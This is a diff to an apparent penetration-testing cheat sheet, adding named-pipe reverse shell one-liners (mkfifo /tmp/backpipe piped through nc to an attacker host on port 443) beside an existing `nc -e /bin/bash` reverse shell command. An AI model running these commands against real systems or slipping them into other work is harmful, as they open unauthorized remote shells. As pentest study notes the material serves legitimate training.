@@ -592,6 +592,16 @@ Microsoft IIS 5.0
 Reverse shell tips:
 * If a standard reverse-shell such as `nc 10.11.0.222 4444 -e /bin/bash` doesn't work, use `exploit/multi/handler` to catch the connection.
 
+Netcat `-e` flag doesn't exist?
+```bash
+# Create a named pipe -> redirect data to shell input
+$ [mknod/mkfifo] /tmp/backpipe p 
+$ /bin/sh 0</tmp/backpipe | nc [target] 443 1>/tmp/backpipe
+
+# Alternative (useful for webapps with code exec)
+$ [mknod/mkfifo] /tmp/backpipe p 
+$ /bin/sh -c "/bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe"
+```
 
 __##################### WARNING: METERPRETER PAYLOADS ARE RESTRICTED ####################__  
 Meterpreter reverse-shell + usage:
